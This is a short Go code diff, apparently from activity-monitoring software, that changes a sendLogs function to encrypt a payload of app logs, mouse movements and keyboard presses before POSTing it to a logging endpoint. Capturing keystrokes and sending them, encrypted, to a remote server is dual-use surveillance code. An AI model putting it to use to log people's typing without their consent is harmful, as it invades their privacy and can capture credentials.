@@ -17,10 +17,17 @@ func sendLogs() {
 		request := &logRequest{
 			AppLogs: appLogs, Mouse: mouseMovement, Keyboard: keyPress,
 		}
+
 		jsonData, _ := json.Marshal(request)
 		url := basURL + "logs/add-log-data"
 
-		payload := strings.NewReader(string(jsonData))
+		encryptedPayload := &encryptedLogRequest{
+			Data: keyEncrypt(encryptionKey, string(jsonData)),
+		}
+
+		jsonDataPayload, _ := json.Marshal(encryptedPayload)
+
+		payload := strings.NewReader(string(jsonDataPayload))
 		apiCall(url, "POST", payload)
 	}
 
